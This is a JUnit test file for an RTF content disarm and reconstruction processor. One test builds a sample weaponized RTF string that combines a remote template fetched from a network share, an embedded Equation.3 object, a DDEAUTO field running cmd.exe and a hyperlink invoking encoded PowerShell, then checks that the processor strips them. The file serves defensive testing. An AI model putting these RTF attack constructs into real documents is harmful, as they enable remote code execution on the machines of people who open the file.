package processing.rtf;

import org.junit.jupiter.api.Test;
import processing.common.CDRResult;

import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.*;

public class RTFCDRProcessorTest {

    private final RTFCDRProcessor processor = new RTFCDRProcessor();

    @Test
    void processesAndReconstructsSampleEmbeddedObject() throws Exception {
        Path input = Path.of("samples/test_embedded_object.rtf");
        Path output = Files.createTempFile("docshield-clean-object-", ".rtf");

        try {
            CDRResult result = processor.process(input, output);

            assertTrue(result.isOutputReady());
            assertTrue(result.isReconstructionSuccessful());
            assertFalse(result.isOriginalCopied());
            assertTrue(result.isIntegrityPassed());
            assertTrue(result.isThreatRemoved());
            assertTrue(result.getFinalFindings().isEmpty());
            assertTrue(result.hasThreats());

            String outputContent = Files.readString(output);
            assertFalse(outputContent.contains("\\object"));
            assertFalse(outputContent.contains("\\objdata"));
            assertTrue(outputContent.startsWith("{\\rtf"));
        } finally {
            Files.deleteIfExists(output);
        }
    }

    @Test
    void cleanSampleRtfCopiedUnchangedWithSha256Match() throws Exception {
        Path input = Path.of("samples/file-sample_100kB.rtf");
        Path output = Files.createTempFile("docshield-clean-copy-", ".rtf");

        try {
            CDRResult result = processor.process(input, output);

            assertTrue(result.isOutputReady());
            assertTrue(result.isOriginalCopied());
            assertTrue(result.isIntegrityPassed());
            assertTrue(result.isThreatRemoved());
            assertNotNull(result.getInputSha256());
            assertEquals(result.getInputSha256(), result.getOutputSha256());
            assertEquals(Files.size(input), Files.size(output));
        } finally {
            Files.deleteIfExists(output);
        }
    }

    @Test
    void disarmsCompositeWeaponizedRtf() throws Exception {
        Path input = Files.createTempFile("docshield-weaponized-", ".rtf");
        Path output = Files.createTempFile("docshield-reconstructed-", ".rtf");

        try {
            String maliciousRtf = "{\\rtf1\\ansi\\deff0 " +
                    "{\\*\\template \\\\\\\\10.0.0.1\\\\share\\\\exploit.dotm}" +
                    "{\\object\\objemb\\objclass Equation.3{\\*\\objdata 01050000AABBCCDD}}" +
                    "{\\field{\\*\\fldinst DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/c whoami\"}{\\fldrslt {Benign Heading}}}" +
                    "{\\field{\\*\\fldinst HYPERLINK \"powershell.exe -enc evil\"}{\\fldrslt Safe Link}}" +
                    "\\par Normal body paragraph text.}";
            Files.writeString(input, maliciousRtf);

            CDRResult result = processor.process(input, output);

            assertTrue(result.isOutputReady());
            assertTrue(result.isReconstructionSuccessful());
            assertTrue(result.isIntegrityPassed());
            assertTrue(result.isThreatRemoved());
            assertTrue(result.getFinalFindings().isEmpty());

            String sanitized = Files.readString(output);
            assertFalse(sanitized.contains("exploit.dotm"));
            assertFalse(sanitized.contains("Equation.3"));
            assertFalse(sanitized.contains("DDEAUTO"));
            assertFalse(sanitized.contains("cmd.exe"));
            assertFalse(sanitized.contains("powershell.exe"));
            assertTrue(sanitized.contains("#disarmed"));
            assertTrue(sanitized.contains("Benign Heading"));
            assertTrue(sanitized.contains("Safe Link"));
            assertTrue(sanitized.contains("Normal body paragraph text."));
        } finally {
            Files.deleteIfExists(input);
            Files.deleteIfExists(output);
        }
    }
}
